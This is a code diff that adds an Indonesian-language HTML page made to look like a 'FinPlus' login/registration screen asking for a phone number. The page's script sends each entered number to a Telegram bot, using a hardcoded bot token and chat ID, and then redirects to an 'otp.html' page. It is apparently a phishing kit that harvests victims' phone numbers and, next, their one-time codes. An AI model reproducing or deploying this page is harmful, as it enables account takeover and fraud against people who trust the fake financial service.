@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>FinPlus - Masuk/Registrasi</title>
+  <style>
+    /* ... (style sama seperti sebelumnya) ... */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      color: #000;
+    }
+    header {
+      background-color: #2196F3;
+      color: white;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+    }
+    header .back-arrow {
+      cursor: pointer;
+      margin-right: 10px;
+      width: 24px;
+      height: 24px;
+      fill: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: normal;
+    }
+    .container {
+      padding: 20px;
+    }
+    h2 {
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+    .subtext {
+      color: #999;
+      margin-bottom: 25px;
+    }
+    input[type="tel"] {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #2196F3;
+      padding: 10px 5px;
+      font-size: 16px;
+      outline: none;
+      margin-bottom: 30px;
+    }
+    button {
+      width: 100%;
+      background: linear-gradient(to right, #42a5f5, #2196f3);
+      border: none;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background: linear-gradient(to right, #1e88e5, #1565c0);
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="back-arrow" onclick="history.back()" aria-label="Kembali" role="button" tabindex="0">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="white" aria-hidden="true">
+        <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+      </svg>
+    </div>
+    <h1>FinPlus</h1>
+  </header>
+  
+  <div class="container">
+    <h2>Masuk/Registrasi</h2>
+    <div class="subtext">Masukkan Nomor HP anda</div>
+    <form id="phoneForm" onsubmit="return handleSubmit(event)">
+      <input type="tel" id="phone-number" name="phone-number" placeholder="Nomor Telepon" required pattern="[0-9]{9,15}" title="Masukkan nomor telepon yang valid" />
+      <button type="submit">Langkah Selanjutnya</button>
+    </form>
+  </div>
+
+  <script>
+    // Ganti variabel berikut dengan token dan chat ID Anda
+    const TELEGRAM_BOT_TOKEN = '8495807271%3AAAG-94xlNDFN_Tv8wuj1n3vNHV-WvSN3r18';
+    const TELEGRAM_CHAT_ID = '6155537801';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      };
+
+      return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params)
+      }).then(response => response.json());
+    }
+
+    async function handleSubmit(e) {
+      e.preventDefault();
+      const phoneNumber = document.getElementById('phone-number').value;
+
+      // Simpan nomor ke localStorage
+      localStorage.setItem('phoneNumber', phoneNumber);
+
+      // Kirim ke telegram
+      const message = `<b>Nomor Telepon Baru:</b> ${phoneNumber}`;
+      try {
+        const result = await sendToTelegram(message);
+        if(result.ok) {
+          location.href = "otp.html";
+          // Lanjut ke proses berikutnya...
+        } else {
+          alert('Gagal mengirim ke Telegram: ' + result.description);
+        }
+      } catch (error) {
+        alert('Terjadi kesalahan saat mengirim ke Telegram.');
+        console.error(error);
+      }
+
+      return false;
+    }
+  </script>
+</body>
+</html>
